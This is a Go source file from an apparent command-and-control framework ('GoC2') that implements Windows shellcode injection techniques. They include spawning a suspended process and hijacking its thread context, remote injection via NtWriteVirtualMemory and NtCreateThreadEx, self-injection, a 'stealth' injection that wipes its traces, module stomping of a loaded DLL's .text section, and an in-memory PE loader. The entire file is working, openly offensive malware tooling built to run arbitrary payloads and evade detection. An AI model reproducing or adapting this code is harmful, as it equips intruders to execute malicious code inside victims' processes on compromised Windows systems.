//go:build windows
// +build windows

package processinjection

import (
	"debug/pe"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/latortuga71/GoC2/pkg/peloader"
	"github.com/latortuga71/GoC2/pkg/rawapi"
	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
	if len(args) < 2 {
		return "", fmt.Errorf("Not Enough Args.")
	}
	exeToSpawn := args[0]
	timeoutMinutes := args[1]
	mins, err := strconv.Atoi(timeoutMinutes)
	if err != nil {
		return "", err
	}
	saAttr := windows.SecurityAttributes{}
	saAttr.Length = uint32(unsafe.Sizeof(saAttr))
	saAttr.InheritHandle = 1
	saAttr.SecurityDescriptor = nil
	// create pipe for child process stdout
	var hChildStdinRead windows.Handle
	var hChildStdinWrite windows.Handle
	var hChildStdoutRead windows.Handle
	var hChildStdoutWrite windows.Handle
	err = windows.CreatePipe(&hChildStdoutRead, &hChildStdoutWrite, &saAttr, 0)
	if err != nil {
		return "", err
	}
	err = windows.SetHandleInformation(windows.Handle(hChildStdoutRead), windows.HANDLE_FLAG_INHERIT, 0)
	if err != nil {
		return "", err
	}
	err = windows.CreatePipe(&hChildStdinRead, &hChildStdinWrite, &saAttr, 0)
	if err != nil {
		return "", err
	}
	err = windows.SetHandleInformation(windows.Handle(hChildStdinWrite), windows.HANDLE_FLAG_INHERIT, 0)
	if err != nil {
		return "", err
	}
	//create process
	notepad, err := windows.UTF16PtrFromString(exeToSpawn)
	if err != nil {
		return "", err
	}
	sa := windows.StartupInfo{}
	sa.Cb = uint32(unsafe.Sizeof(sa))
	sa.StdErr = windows.Handle(hChildStdoutWrite)
	sa.StdOutput = windows.Handle(hChildStdoutWrite)
	sa.StdInput = windows.Handle(hChildStdinRead)
	sa.Flags |= windows.STARTF_USESTDHANDLES
	sa.Flags |= windows.STARTF_USESHOWWINDOW
	sa.ShowWindow = windows.SW_HIDE
	pi := windows.ProcessInformation{}
	err = windows.CreateProcess(nil, notepad, nil, nil, true, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, &sa, &pi)
	if err != nil {
		return "", err
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(windows.Handle(hChildStdoutWrite))
	windows.CloseHandle(windows.Handle(hChildStdinRead))
	pidStr := strconv.Itoa(int(pi.ProcessId))
	hThread, threadStart, err := RemoteInjectReturnThread(shellcode, pidStr)
	if err != nil {
		return "", err
	}
	// get thread context
	ctx := winapi.CONTEXT{}
	ctx.ContextFlags = winapi.CONTEXT_INTEGER
	err = winapi.GetThreadContext(uintptr(hThread), &ctx)
	if err != nil {
		return "", err
	}
	ctx.Rax = winapi.DWORD64(threadStart)
	// setting main thread to be our injected code.
	err = winapi.SetThreadContext(uintptr(hThread), &ctx)
	if err != nil {
		return "", err
	}
	windows.ResumeThread(windows.Handle(hThread))
	// now we wait for our thread to finish then send a
	var exitCode uint32
	var STILL_RUNNING uint32 = 259
	var loops int
	for {
		if mins != 0 {
			if loops > mins {
				break
			}
		}
		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			return "", err
		}
		if exitCode == STILL_RUNNING {
			time.Sleep(1000 * time.Millisecond)
			loops++
		} else {
			break
		}
	}
	windows.TerminateProcess(pi.Process, 0)
	windows.CloseHandle(pi.Process)
	buffer := make([]byte, 10)
	var nRead uint32
	var results string
	for {
		err = windows.ReadFile(windows.Handle(hChildStdoutRead), buffer, &nRead, nil)
		if err != nil {
			break
		}
		results += string(buffer)
	}
	return results, nil
}

/*
func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
	cmd := exec.Command(exeToSpawn)
	cmd.SysProcAttr = new(syscall.SysProcAttr)
	cmd.SysProcAttr.HideWindow = true
	stdout, err := cmd.StdoutPipe()
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return "", err
	}
	err = cmd.Start()
	if err != nil {
		return "", err
	}
	pidStr := strconv.Itoa(cmd.Process.Pid)
	// now we inject thread and wait on it.
	hThread, err := RemoteInjectReturnThread(shellcode, pidStr)
	if err != nil {
		return "", err
	}
	log.Println("Confirmed inject thread")
	// now we wait for our thread to finish then send a
	var exitCode uint32
	var STILL_RUNNING uint32 = 259
	for {
		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			log.Fatalln(err.Error())
		}
		if exitCode == STILL_RUNNING {
			time.Sleep(1000 * time.Millisecond)
		} else {
			break
		}
	}
	time.Sleep(10 * time.Second)
	// kill the process and then read from pipes.
	cmd.Process.Kill()
	stderrBuff := bufio.NewScanner(stderr)
	stdoutBuff := bufio.NewScanner(stdout)
	var allText []string
	allText = append(allText, "\n[+] Fork and run completed.\n")
	for stderrBuff.Scan() {
		allText = append(allText, stderrBuff.Text())
	}
	for stdoutBuff.Scan() {
		allText = append(allText, stdoutBuff.Text())
	}
	allText = append(allText, "\n [+] End of output")
	completed := strings.Join(allText, "\n")
	return completed, nil
}
*/

func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
	arg0, err := syscall.UTF16PtrFromString(exeToSpawn)
	if err != nil {
		return "", err
	}

	si := new(windows.StartupInfo)
	si.Cb = uint32(unsafe.Sizeof(*si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	pi := new(windows.ProcessInformation)
	err = windows.CreateProcess(nil, arg0, nil, nil, false, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, si, pi)
	if err != nil {
		return "", err
	}
	pidStr := strconv.Itoa(int(pi.ProcessId))
	hThread, threadStart, err := RemoteInjectReturnThread(shellcode, pidStr)
	if err != nil {
		return "", err
	}
	// get thread context
	ctx := winapi.CONTEXT{}
	ctx.ContextFlags = winapi.CONTEXT_INTEGER
	err = winapi.GetThreadContext(uintptr(hThread), &ctx)
	if err != nil {
		return "", err
	}
	ctx.Rax = winapi.DWORD64(threadStart)
	// setting main thread to be our injected code.
	err = winapi.SetThreadContext(uintptr(hThread), &ctx)
	if err != nil {
		return "", err
	}
	windows.ResumeThread(windows.Handle(hThread))
	go func() {
		// wait for our code to finish then resume main thread so process continues normally.
		windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
		windows.ResumeThread(pi.Thread)
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}()
	return fmt.Sprintf("[+] Success Created PID %s", pidStr), nil
}

func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, uintptr, error) {
	var rights uint32 = windows.PROCESS_CREATE_THREAD |
		windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ
	intpid, err := strconv.Atoi(pid)
	if err != nil {
		return 0, 0, err
	}
	procHandle, err := rawapi.NtOpenProcess(uint32(intpid), rights)
	if procHandle == 0 {
		return 0, 0, err
	}
	var flProtect uint32 = windows.PAGE_READWRITE
	var newFlProtect uint32 = windows.PAGE_EXECUTE_READ
	var shellcodelen uintptr = uintptr(len(shellcode))
	var lpBaseAddress uintptr = 0
	var lens uint64 = uint64(len(shellcode))
	lpBaseAddress, err = rawapi.NtAllocateVirtualMemory(procHandle, lpBaseAddress, 0, lens, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil || lpBaseAddress == 0 {
		return 0, 0, err
	}
	var nBytesWritten *uint32
	err = rawapi.NtWriteVirtualMemory(uintptr(procHandle), lpBaseAddress, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(lens), nBytesWritten)
	if err != nil {
		windows.CloseHandle(windows.Handle(procHandle))
		return 0, 0, err
	}
	err = rawapi.NtProtectVirtualMemory(uintptr(procHandle), lpBaseAddress, &shellcodelen, newFlProtect, &flProtect)
	if err != nil {
		windows.CloseHandle(windows.Handle(procHandle))
		return 0, 0, err
	}
	var remoteThread uintptr
	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
		&remoteThread,          //hthread
		0x1FFFFF,               //desiredaccess
		0,                      //objattributes
		uintptr(procHandle),    //processhandle
		uintptr(lpBaseAddress), //lpstartaddress
		0,                      //lpparam
		uintptr(0),             //createsuspended
		0,                      //zerobits
		0,                      //sizeofstackcommit
		0,                      //sizeofstackreserve
		0,                      //lpbytesbuffer
	)
	if err4 != nil {
		windows.CloseHandle(windows.Handle(procHandle))
		return 0, 0, err
	}
	return syscall.Handle(remoteThread), lpBaseAddress, nil
}

func RemoteInject(shellcode []byte, pid string) (string, error) {
	intpid, err := strconv.Atoi(pid)
	if err != nil {
		return "", err
	}
	var rights uint32 = windows.PROCESS_CREATE_THREAD |
		windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ
	procHandle, err := rawapi.NtOpenProcess(uint32(intpid), rights)
	if procHandle == 0 {
		return "", err
	}
	var flProtect uint32 = windows.PAGE_READWRITE
	var newFlProtect uint32 = windows.PAGE_EXECUTE_READ
	var shellcodelen uintptr = uintptr(len(shellcode))
	var lpBaseAddress uintptr = 0
	var lens uint64 = uint64(len(shellcode))
	lpBaseAddress, err = rawapi.NtAllocateVirtualMemory(procHandle, lpBaseAddress, 0, lens, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return "", err
	}
	var nBytesWritten *uint32
	err = rawapi.NtWriteVirtualMemory(uintptr(procHandle), lpBaseAddress, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(lens), nBytesWritten)
	if err != nil {
		windows.CloseHandle(windows.Handle(procHandle))
		return "", err
	}
	err = rawapi.NtProtectVirtualMemory(uintptr(procHandle), lpBaseAddress, &shellcodelen, newFlProtect, &flProtect)
	if err != nil {
		windows.CloseHandle(windows.Handle(procHandle))
		return "", err
	}
	var remoteThread uintptr
	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
		&remoteThread,          //hthread
		0x1FFFFF,               //desiredaccess
		0,                      //objattributes
		uintptr(procHandle),    //processhandle
		uintptr(lpBaseAddress), //lpstartaddress
		0,                      //lpparam
		uintptr(0),             //createsuspended
		0,                      //zerobits
		0,                      //sizeofstackcommit
		0,                      //sizeofstackreserve
		0,                      //lpbytesbuffer
	)
	if err4 != nil {
		windows.CloseHandle(windows.Handle(procHandle))
		return "", err
	}
	if remoteThread == 0 {
		windows.CloseHandle(windows.Handle(procHandle))
		return "", err4
	}
	go func() {
		windows.WaitForSingleObject(windows.Handle(remoteThread), windows.INFINITE)
		var freed uint64
		rawapi.NtFreeVirtualMemory(procHandle, lpBaseAddress, freed, windows.MEM_RELEASE)
		windows.CloseHandle(windows.Handle(remoteThread))
		windows.CloseHandle(windows.Handle(procHandle))
	}()
	return "[+] Success", nil
}

func SelfInject(shellcode []byte) (string, error) {
	shellcodeLen := len(shellcode)
	heap, err := winapi.HeapCreate(winapi.HEAP_CREATE_ENABLE_EXECUTE, uint32(shellcodeLen), 0)
	if heap == 0 {
		return "", err
	}
	memoryAddress, err := winapi.HeapAlloc(syscall.Handle(heap), winapi.HEAP_ZERO_MEMORY, uint32(shellcodeLen))
	if memoryAddress == 0 {
		return "", err
	}
	err = winapi.RtlCopyMemory(uintptr(memoryAddress), uintptr(unsafe.Pointer(&shellcode[0])), uint32(shellcodeLen))
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	hThread, err := winapi.CreateThread(
		uintptr(winapi.NullRef),
		0,
		uintptr(memoryAddress),
		uintptr(winapi.NullRef),
		dwCreationFlags,
		&threadId)
	if hThread == 0 {
		winapi.HeapFree(heap, 0, memoryAddress)
		winapi.HeapDestroy(heap)
		return "", err
	}
	go func() {
		windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
		winapi.HeapFree(heap, 0, memoryAddress)
		winapi.HeapDestroy(heap)
	}()
	return "[+] Success", nil
}

func RawSelfInject(shellcode []byte) (string, error) {
	shellcodeLen := len(shellcode)
	var freed uint64
	var baseA uintptr
	baseA, err := rawapi.NtAllocateVirtualMemory(rawapi.ThisThread, baseA, 0, uint64(shellcodeLen), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return "", err
	}
	var written uint32
	err2 := rawapi.NtWriteVirtualMemory(rawapi.ThisThread, baseA, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &written)
	if err2 != nil {
		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
		return "", err2
	}
	var lens uintptr = uintptr(shellcodeLen)
	var oldprot uint32
	err = rawapi.NtProtectVirtualMemory(rawapi.ThisThread, baseA, &lens, windows.PAGE_EXECUTE_READ, &oldprot)
	if err != nil {
		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
		return "", err
	}
	var hhosthread uintptr
	err3 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
		&hhosthread,       //hthread
		0x1FFFFF,          //desiredaccess
		0,                 //objattributes
		rawapi.ThisThread, //processhandle
		baseA,             //lpstartaddress
		0,                 //lpparam
		uintptr(0),        //createsuspended
		0,                 //zerobits
		0,                 //sizeofstackcommit
		0,                 //sizeofstackreserve
		0,                 //lpbytesbuffer
	)
	// cleanup
	if err3 != nil {
		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
		return "", err3
	}
	go func() {
		windows.WaitForSingleObject(windows.Handle(hhosthread), windows.INFINITE)
		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
	}()
	return "[+] Success", nil
}

func memsetLoop(a []byte, v byte) {
	for i := range a {
		a[i] = v
	}
}

func RemoteInjectStealth(shellcode []byte, pid string, addresstoinject string) (string, error) {
	// since we have address we just
	intpid, err := strconv.Atoi(pid)
	if err != nil {
		return "", err
	}
	// convert address to uintptr remove 0x if there
	if strings.HasPrefix(addresstoinject, "0x") {
		addresstoinject = strings.Split(addresstoinject, "0x")[1]
	}
	u, err := strconv.ParseUint(addresstoinject, 16, 64)
	if err != nil {
		return "", err
	}
	hProcess, err := rawapi.NtOpenProcess(uint32(intpid), windows.MAXIMUM_ALLOWED)
	if hProcess == 0 {
		return "", err
	}
	baseAddressPtr := uintptr(unsafe.Pointer(uintptr(u)))
	var wrote uint32
	err = rawapi.NtWriteVirtualMemory(uintptr(hProcess), baseAddressPtr, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(len(shellcode)), &wrote)
	if err != nil {
		windows.CloseHandle(windows.Handle(hProcess))
		return "", err
	}
	var remoteThread uintptr
	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
		&remoteThread,           //hthread
		0x1FFFFF,                //desiredaccess
		0,                       //objattributes
		uintptr(hProcess),       //processhandle
		uintptr(baseAddressPtr), //lpstartaddress
		0,                       //lpparam
		uintptr(0),              //createsuspended
		0,                       //zerobits
		0,                       //sizeofstackcommit
		0,                       //sizeofstackreserve
		0,                       //lpbytesbuffer
	)
	if err4 != nil {
		windows.CloseHandle(windows.Handle(hProcess))
		return "", err
	}
	go func() {
		// we wait for it to finish then zero the memory to set it back to normal
		windows.WaitForSingleObject(windows.Handle(remoteThread), windows.INFINITE)
		memsetLoop(shellcode, 0)
		rawapi.NtWriteVirtualMemory(uintptr(hProcess), uintptr(baseAddressPtr), uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(len(shellcode)), &wrote)
		windows.CloseHandle(windows.Handle(remoteThread))
		windows.CloseHandle(windows.Handle(hProcess))
		shellcode = nil
	}()
	return fmt.Sprintf("[+] Silently Jabbed Pid %s at %p\n", pid, unsafe.Pointer(baseAddressPtr)), nil
}

func ModuleStomp(shellcode []byte, addresstoinject string) (string, error) {
	if strings.HasPrefix(addresstoinject, "0x") {
		addresstoinject = strings.Split(addresstoinject, "0x")[1]
	}
	u, err := strconv.ParseUint(addresstoinject, 16, 64)
	if err != nil {
		return "", err
	}
	moduleHandle := uintptr(unsafe.Pointer(uintptr(u)))
	dosHeader := (*peloader.ImageDOSHeader)(unsafe.Pointer(moduleHandle))
	imageNtHeader := (*peloader.ImageNtHeader)(unsafe.Pointer(moduleHandle + uintptr(dosHeader.AddressOfNewEXEHeader)))
	offset := unsafe.Sizeof(pe.FileHeader{}) + unsafe.Sizeof(uint32(1))
	textPtr := uintptr(unsafe.Pointer(imageNtHeader)) + offset + uintptr(imageNtHeader.FileHeader.SizeOfOptionalHeader)
	textSection := (*pe.SectionHeader32)(unsafe.Pointer(textPtr))
	textSz := textSection.VirtualSize
	if len(shellcode) > int(textSz) {
		return "", errors.New("Payload too big for .text size")
	}
	var nBytesRead uint32
	var freed uint64
	var payloadLength uint32 = uint32(len(shellcode))
	hProcess, err := windows.GetCurrentProcess()
	if err != nil {
		return "", err
	}
	var base uintptr
	base, err = rawapi.NtAllocateVirtualMemory(rawapi.ThisThread, base, 0, uint64(payloadLength), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return "", err
	}
	textStart := uintptr(unsafe.Pointer(moduleHandle + uintptr(textSection.VirtualAddress)))
	err = rawapi.NtReadVirtualMemory(uintptr(hProcess), textStart, base, payloadLength, &nBytesRead)
	if err != nil {
		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
		return "", err
	}
	var oldProtect uint32
	var szPtr uintptr = uintptr(textSz)
	err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
		return "", err
	}
	var nBytesWritten *uint32
	err = rawapi.NtWriteVirtualMemory(uintptr(hProcess), textStart, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), nBytesWritten)
	if err != nil {
		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
		return "", err
	}
	err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, oldProtect, &oldProtect)
	if err != nil {
		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
		return "", err
	}
	var remoteThread uintptr
	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
		&remoteThread,     //hthread
		0x1FFFFF,          //desiredaccess
		0,                 //objattributes
		uintptr(hProcess), //processhandle
		textStart,         //lpstartaddress
		0,                 //lpparam
		uintptr(0),        //createsuspended
		0,                 //zerobits
		0,                 //sizeofstackcommit
		0,                 //sizeofstackreserve
		0,                 //lpbytesbuffer
	)

	if err4 != nil {
		rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, windows.PAGE_READWRITE, &oldProtect)
		rawapi.NtWriteVirtualMemory(uintptr(hProcess), textStart, base, uintptr(payloadLength), nBytesWritten)
		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
		return "", err4
	}
	go func() {
		windows.WaitForSingleObject(windows.Handle(remoteThread), windows.INFINITE)
		err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, windows.PAGE_READWRITE, &oldProtect)
		err = rawapi.NtWriteVirtualMemory(uintptr(hProcess), textStart, base, uintptr(payloadLength), nBytesWritten)
		err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, oldProtect, &oldProtect)
		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
		windows.CloseHandle(windows.Handle(remoteThread))
	}()
	return "[+] Stomped.", nil
}

func LoadPE(shellcode []byte, args []string) (string, error) {
	if len(args) != 2 {
		return "", errors.New("Not Enough Args.")
	}
	peType := args[0]
	removeH := args[1]
	removeHeaders, err := strconv.Atoi(removeH)
	if err != nil {
		return "", err
	}
	var remove bool
	if removeHeaders == 1 {
		remove = true
	}
	var t int
	if peType == "dll" {
		t = 0
	} else {
		t = 1
	}
	if peloader.PeType(t) == peloader.Dll {
		raw := peloader.NewRawPE(peloader.Dll, remove, shellcode)
		err := raw.LoadPEFromMemory()
		if err != nil {
			return "", err
		}
		err = raw.FreePeDllFromMemory()
		if err != nil {
			return "", err
		}
		return "[+] Successfully loaded dll via custom pe loader", nil
	}
	raw := peloader.NewRawPE(peloader.Exe, remove, shellcode)
	err = raw.LoadPEFromMemory()
	if err != nil {
		return "", err
	}
	err = raw.FreePeFromMemory()
	if err != nil {
		return "", err
	}
	return "[+] Successfully loaded exe via custom pe loader", nil
}
